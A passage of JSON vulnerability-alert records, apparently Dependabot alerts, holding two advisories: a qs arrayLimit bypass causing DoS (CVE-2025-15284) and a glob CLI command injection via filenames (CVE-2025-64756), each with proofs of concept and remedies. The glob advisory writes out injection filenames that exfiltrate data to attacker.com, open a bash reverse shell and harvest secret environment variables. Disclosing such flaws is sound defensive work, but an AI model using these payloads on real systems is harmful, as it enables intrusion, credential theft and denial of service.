Applications using `arrayLimit` for DoS protection are vulnerable.\n\n### Details\n\nThe `arrayLimit` option only checks limits for indexed notation (`a[0]=1\u0026a[1]=2`) but completely bypasses it for bracket notation (`a[]=1\u0026a[]=2`).\n\n**Vulnerable code** (`lib/parse.js:159-162`):\n```javascript\nif (root === '[]' \u0026\u0026 options.parseArrays) {\n    obj = utils.combine([], leaf);  // No arrayLimit check\n}\n```\n\n**Working code** (`lib/parse.js:175`):\n```javascript\nelse if (index \u003c= options.arrayLimit) {  // Limit checked here\n    obj = [];\n    obj[index] = leaf;\n}\n```\n\nThe bracket notation handler at line 159 uses `utils.combine([], leaf)` without validating against `options.arrayLimit`, while indexed notation at line 175 checks `index \u003c= options.arrayLimit` before creating arrays.\n\n### PoC\n\n**Test 1 - Basic bypass:**\n```bash\nnpm install qs\n```\n\n```javascript\nconst qs = require('qs');\nconst result = qs.parse('a[]=1\u0026a[]=2\u0026a[]=3\u0026a[]=4\u0026a[]=5\u0026a[]=6', { arrayLimit: 5 });\nconsole.log(result.a.length);  // Output: 6 (should be max 5)\n```\n\n**Test 2 - DoS demonstration:**\n```javascript\nconst qs = require('qs');\nconst attack = 'a[]=' + Array(10000).fill('x').join('\u0026a[]=');\nconst result = qs.parse(attack, { arrayLimit: 100 });\nconsole.log(result.a.length);  // Output: 10000 (should be max 100)\n```\n\n**Configuration:**\n- `arrayLimit: 5` (test 1) or `arrayLimit: 100` (test 2)\n- Use bracket notation: `a[]=value` (not indexed `a[0]=value`)\n\n### Impact\n\nDenial of Service via memory exhaustion. Affects applications using `qs.parse()` with user-controlled input and `arrayLimit` for protection.\n\n**Attack scenario:**\n1. Attacker sends HTTP request: `GET /api/search?filters[]=x\u0026filters[]=x\u0026...\u0026filters[]=x` (100,000+ times)\n2. Application parses with `qs.parse(query, { arrayLimit: 100 })`\n3. qs ignores limit, parses all 100,000 elements into array\n4. Server memory exhausted → application crashes or becomes unresponsive\n5. Service unavailable for all users\n\n**Real-world impact:**\n- Single malicious request can crash server\n- No authentication required\n- Easy to automate and scale\n- Affects any endpoint parsing query strings with bracket notation\n\n### Suggested Fix\n\nAdd `arrayLimit` validation to the bracket notation handler. The code already calculates `currentArrayLength` at line 147-151, but it's not used in the bracket notation handler at line 159.\n\n**Current code** (`lib/parse.js:159-162`):\n```javascript\nif (root === '[]' \u0026\u0026 options.parseArrays) {\n    obj = options.allowEmptyArrays \u0026\u0026 (leaf === '' || (options.strictNullHandling \u0026\u0026 leaf === null))\n        ? []\n        : utils.combine([], leaf);  // No arrayLimit check\n}\n```\n\n**Fixed code**:\n```javascript\nif (root === '[]' \u0026\u0026 options.parseArrays) {\n    // Use currentArrayLength already calculated at line 147-151\n    if (options.throwOnLimitExceeded \u0026\u0026 currentArrayLength \u003e= options.arrayLimit) {\n        throw new RangeError('Array limit exceeded. Only ' + options.arrayLimit + ' element' + (options.arrayLimit === 1 ? '' : 's') + ' allowed in an array.');\n    }\n    \n    // If limit exceeded and not throwing, convert to object (consistent with indexed notation behavior)\n    if (currentArrayLength \u003e= options.arrayLimit) {\n        obj = options.plainObjects ? { __proto__: null } : {};\n        obj[currentArrayLength] = leaf;\n    } else {\n        obj = options.allowEmptyArrays \u0026\u0026 (leaf === '' || (options.strictNullHandling \u0026\u0026 leaf === null))\n            ? []\n            : utils.combine([], leaf);\n    }\n}\n```\n\nThis makes bracket notation behaviour consistent with indexed notation, enforcing `arrayLimit` and converting to object when limit is exceeded (per README documentation).","epss":{"percentage":0.00152,"percentile":0.36343},"ghsa_id":"GHSA-6rw7-vpxm-498p","identifiers":[{"type":"GHSA","value":"GHSA-6rw7-vpxm-498p"},{"type":"CVE","value":"CVE-2025-15284"}],"published_at":"2025-12-30T21:02:54Z","references":[{"url":"https://github.com/ljharb/qs/security/advisories/GHSA-6rw7-vpxm-498p"},{"url":"https://nvd.nist.gov/vuln/detail/CVE-2025-15284"},{"url":"https://github.com/ljharb/qs/commit/3086902ecf7f088d0d1803887643ac6c03d415b9"},{"url":"https://github.com/advisories/GHSA-6rw7-vpxm-498p"}],"severity":"high","summary":"qs's arrayLimit bypass in its bracket notation allows DoS via memory exhaustion","updated_at":"2025-12-30T21:02:55Z","vulnerabilities":[{"first_patched_version":{"identifier":"6.14.1"},"package":{"ecosystem":"npm","name":"qs"},"severity":"high","vulnerable_version_range":"\u003c 6.14.1"}],"withdrawn_at":null},"security_vulnerability":{"first_patched_version":{"identifier":"6.14.1"},"package":{"ecosystem":"npm","name":"qs"},"severity":"high","vulnerable_version_range":"\u003c 6.14.1"},"state":"open","updated_at":"2026-01-01T07:45:21Z","url":"https://api.github.com/repos/appsec-ai-initiative-dev/unguard/dependabot/alerts/186"}

User runs `glob -c \u003ccommand\u003e \u003cpattern\u003e` \n2. CLI finds files matching the pattern\n3. Matched filenames are collected into an array\n4. Command is executed with matched filenames as arguments using `shell: true`\n5. Shell interprets metacharacters in filenames as command syntax\n6. Malicious filenames execute arbitrary commands\n\n**Affected Component:**\n- **CLI Only:** The vulnerability affects only the command-line interface\n- **Library Safe:** The core glob library API (`glob()`, `globSync()`, streams/iterators) is not affected\n- **Shell Dependency:** Exploitation requires shell metacharacter support (primarily POSIX systems)\n\n**Attack Surface:**\n- Files with names containing shell metacharacters: `$()`, backticks, `;`, `\u0026`, `|`, etc.\n- Any directory where attackers can control filenames (PR branches, archives, user uploads)\n- CI/CD pipelines using `glob -c` on untrusted content\n\n### PoC\n\n**Setup Malicious File:**\n```bash\nmkdir test_directory \u0026\u0026 cd test_directory\n\n# Create file with command injection payload in filename\ntouch '$(touch injected_poc)'\n```\n\n**Trigger Vulnerability:**\n```bash\n# Run glob CLI with -c option\nnode /path/to/glob/dist/esm/bin.mjs -c echo \"**/*\"\n```\n\n**Result:**\n- The echo command executes normally\n- **Additionally:** The `$(touch injected_poc)` in the filename is evaluated by the shell\n- A new file `injected_poc` is created, proving command execution\n- Any command can be injected this way with full user privileges\n\n**Advanced Payload Examples:**\n\n**Data Exfiltration:**\n```bash\n# Filename: $(curl -X POST https://attacker.com/exfil -d \"$(whoami):$(pwd)\" \u003e /dev/null 2\u003e\u00261)\ntouch '$(curl -X POST https://attacker.com/exfil -d \"$(whoami):$(pwd)\" \u003e /dev/null 2\u003e\u00261)'\n```\n\n**Reverse Shell:**\n```bash\n# Filename: $(bash -i \u003e\u0026 /dev/tcp/attacker.com/4444 0\u003e\u00261)\ntouch '$(bash -i \u003e\u0026 /dev/tcp/attacker.com/4444 0\u003e\u00261)'\n```\n\n**Environment Variable Harvesting:**\n```bash\n# Filename: $(env | grep -E \"(TOKEN|KEY|SECRET)\" \u003e /tmp/secrets.txt)\ntouch '$(env | grep -E \"(TOKEN|KEY|SECRET)\" \u003e /tmp/secrets.txt)'\n```\n\n### Impact\n\n**Arbitrary Command Execution:**\n- Commands execute with full privileges of the user running glob CLI\n- No privilege escalation required - runs as current user\n- Access to environment variables, file system, and network\n\n**Real-World Attack Scenarios:**\n\n**1. CI/CD Pipeline Compromise:**\n- Malicious PR adds files with crafted names to repository\n- CI pipeline uses `glob -c` to process files (linting, testing, deployment)\n- Commands execute in CI environment with build secrets and deployment credentials\n- Potential for supply chain compromise through artifact tampering\n\n**2. Developer Workstation Attack:**\n- Developer clones repository or extracts archive containing malicious filenames\n- Local build scripts use `glob -c` for file processing\n- Developer machine compromise with access to SSH keys, tokens, local services\n\n**3. Automated Processing Systems:**\n- Services using glob CLI to process uploaded files or external content\n- File uploads with malicious names trigger command execution\n- Server-side compromise with potential for lateral movement\n\n**4. Supply Chain Poisoning:**\n- Malicious packages or themes include files with crafted names\n- Build processes using glob CLI automatically process these files\n- Wide distribution of compromise through package ecosystems\n\n**Platform-Specific Risks:**\n- **POSIX/Linux/macOS:** High risk due to flexible filename characters and shell parsing\n- **Windows:** Lower risk due to filename restrictions, but vulnerability persists with PowerShell, Git Bash, WSL\n- **Mixed Environments:** CI systems often use Linux containers regardless of developer platform\n\n### Affected Products\n\n- **Ecosystem:** npm\n- **Package name:** glob\n- **Component:** CLI only (`src/bin.mts`)\n- **Affected versions:** v10.2.0 through v11.0.3 (and likely later versions until patched)\n- **Introduced:** v10.2.0 (first release with CLI containing `-c/--cmd` option)\n- **Patched versions:** 11.1.0and 10.5.0\n\n**Scope Limitation:**\n- **Library API Not Affected:** Core glob functions (`glob()`, `globSync()`, async iterators) are safe\n- **CLI-Specific:** Only the command-line interface with `-c/--cmd` option is vulnerable\n\n### Remediation\n\n- Upgrade to `glob@10.5.0`, `glob@11.1.0`, or higher, as soon as possible.\n- If any `glob` CLI actions fail, then convert commands containing positional arguments, to use the `--cmd-arg`/`-g` option instead.\n- As a last resort, use `--shell` to maintain `shell:true` behavior until glob v12, but take care to ensure that no untrusted contents can possibly be encountered in the file path results.","epss":{"percentage":0.00044,"percentile":0.13743},"ghsa_id":"GHSA-5j98-mcp5-4vw2","identifiers":[{"type":"GHSA","value":"GHSA-5j98-mcp5-4vw2"},{"type":"CVE","value":"CVE-2025-64756"}],"published_at":"2025-11-17T17:38:56Z","references":[{"url":"https://github.com/isaacs/node-glob/security/advisories/GHSA-5j98-mcp5-4vw2"},{"url":"https://github.com/isaacs/node-glob/commit/47473c046b91c67269df7a66eab782a6c2716146"},{"url":"https://nvd.nist.gov/vuln/detail/CVE-2025-64756"},{"url":"https://github.com/isaacs/node-glob/commit/1e4e297342a09f2aa0ced87fcd4a70ddc325d75f"},{"url":"https://github.com/advisories/GHSA-5j98-mcp5-4vw2"}],"severity":"high","summary":"glob CLI: Command injection via -c/--cmd executes matches with shell:true","updated_at":"2025-11-19T02:30:53Z","vulnerabilities":[{"first_patched_version":{"identifier":"11.1.0"},"package":{"ecosystem":"npm","name":"glob"},"severity":"high","vulnerable_version_range":"\u003e= 11.0.0, \u003c 11.1.0"},{"first_patched_version":{"identifier":"10.5.0"},"package":{"ecosystem":"npm","name":"glob"},"severity":"high","vulnerable_version_range":"\u003e= 10.2.0, \u003c 10.5.0"}],"withdrawn_at":null},"security_vulnerability":{"first_patched_version":{"identifier":"10.5.0"},"package":{"ecosystem":"npm","name":"glob"},"severity":"high","vulnerable_version_range":"\u003e= 10.2.0, \u003c 10.5.0"},"state":"open","updated_at":"2025-11-20T02:37:59Z","url":"https://api.github.com/repos/appsec-ai-initiative-dev/unguard/dependabot/alerts/170"}
